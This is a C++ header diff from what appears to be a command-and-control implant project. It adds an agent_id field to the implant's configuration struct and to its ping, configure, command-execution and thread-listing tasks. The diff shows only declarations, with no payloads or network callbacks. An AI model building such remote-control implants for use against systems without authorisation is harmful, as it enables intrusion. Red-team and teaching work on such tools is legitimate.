@@ -21,9 +21,10 @@
 
 // Define implant configuration
 struct Configuration {
-	Configuration(double meanDwell, bool isRunning);
+	Configuration(double meanDwell, bool isRunning, std::string agent_id);
 	const double meanDwell;
 	const bool isRunning;
+	const std::string agent_id;
 };
 
 
@@ -33,10 +34,12 @@ struct Configuration {
 // PingTask
 // -------------------------------------------------------------------------------------------
 struct PingTask {
-	PingTask(const boost::uuids::uuid& id);
+	PingTask(const boost::uuids::uuid& id,
+		const std::string agent_id);
 	constexpr static std::string_view key{ "ping" };
 	[[nodiscard]] Result run() const;
 	const boost::uuids::uuid id;
+	const std::string agent_id;
 };
 
 
@@ -46,6 +49,7 @@ struct ConfigureTask {
 	ConfigureTask(const boost::uuids::uuid& id,
 		double meanDwell,
 		bool isRunning,
+		std::string agent_id,
 		std::function<void(const Configuration&)> setter);
 	constexpr static std::string_view key{ "configure" };
 	[[nodiscard]] Result run() const;
@@ -54,16 +58,18 @@ private:
 	std::function<void(const Configuration&)> setter;
 	const double meanDwell;
 	const bool isRunning;
+	const std::string agent_id;
 };
 
 
 // ExecuteTask
 // -------------------------------------------------------------------------------------------
 struct ExecuteTask {
-	ExecuteTask(const boost::uuids::uuid& id, std::string command);
+	ExecuteTask(const boost::uuids::uuid& id, std::string agent_id, std::string command);
 	constexpr static std::string_view key{ "execute" };
 	[[nodiscard]] Result run() const;
 	const boost::uuids::uuid id;
+	const std::string agent_id;
 
 private:
 	const std::string command;
@@ -73,10 +79,11 @@ private:
 // ListThreadsTask
 // -------------------------------------------------------------------------------------------
 struct ListThreadsTask {
-	ListThreadsTask(const boost::uuids::uuid& id, std::string processId);
+	ListThreadsTask(const boost::uuids::uuid& id, std::string agent_id, std::string processId);
 	constexpr static std::string_view key{ "list-threads" };
 	[[nodiscard]] Result run() const;
 	const boost::uuids::uuid id;
+	const std::string agent_id;
 private:
 	const std::string processId;
 };
